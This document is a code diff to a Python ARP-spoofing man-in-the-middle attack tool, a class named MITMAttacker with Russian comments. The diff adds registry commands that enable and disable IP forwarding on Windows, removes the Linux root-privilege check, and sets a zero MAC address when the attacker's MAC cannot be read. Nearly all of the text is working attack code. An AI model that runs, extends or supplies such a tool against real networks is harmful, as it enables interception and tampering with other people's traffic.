@@ -31,6 +31,9 @@ class MITMAttacker:
         # Проверяем наличие Npcap
         self.npcap_available = self._check_npcap()
 
+        # Получаем MAC адреса
+        self._get_macs()
+
     def _check_npcap(self) -> bool:
         """Проверить наличие Npcap/WinPcap"""
         if platform.system() != "Windows":
@@ -50,9 +53,6 @@ class MITMAttacker:
                 return True
 
         return False
-
-        # Получаем MAC адреса
-        self._get_macs()
 
     def _get_macs(self):
         """Получить MAC адреса целевых устройств"""
@@ -123,7 +123,7 @@ class MITMAttacker:
                 with open(f"/sys/class/net/{self.interface}/address", 'r') as f:
                     self.attacker_mac = f.read().strip()
             except:
-                pass
+                self.attacker_mac = "00:00:00:00:00:00"
 
     def _get_mac_from_arp_cache(self, ip: str) -> Optional[str]:
         """Получить MAC адрес из ARP кэша Windows"""
@@ -179,10 +179,6 @@ class MITMAttacker:
         """Отправить поддельный ARP пакет"""
         if platform.system() == "Windows" and not self.npcap_available:
             print("[!] ARP spoofing requires Npcap on Windows")
-            return False
-
-        if platform.system() != "Windows" and not check_root():
-            print("[!] ARP spoofing requires root privileges on Linux")
             return False
 
         try:
@@ -296,6 +292,16 @@ class MITMAttacker:
         if platform.system() != "Windows":
             if not enable_ip_forwarding():
                 print("[!] Не удалось включить IP forwarding. Атака может не работать.")
+        else:
+            # На Windows включаем IP forwarding через реестр
+            try:
+                subprocess.run(
+                    'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f',
+                    shell=True, check=True
+                )
+                print("[*] IP forwarding enabled on Windows")
+            except:
+                print("[!] Failed to enable IP forwarding on Windows")
 
         self.running = True
         self.spoofing = True
@@ -344,9 +350,19 @@ class MITMAttacker:
             print("[*] Восстановление ARP таблиц...")
             self.restore(self.target_ip, self.gateway_ip)
 
-        # Выключаем IP forwarding (только на Linux)
+        # Выключаем IP forwarding
         if platform.system() != "Windows":
             disable_ip_forwarding()
+        else:
+            # На Windows отключаем IP forwarding
+            try:
+                subprocess.run(
+                    'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 0 /f',
+                    shell=True, check=True
+                )
+                print("[*] IP forwarding disabled on Windows")
+            except:
+                pass
 
         # Выводим статистику
         duration = time.time() - self.start_time
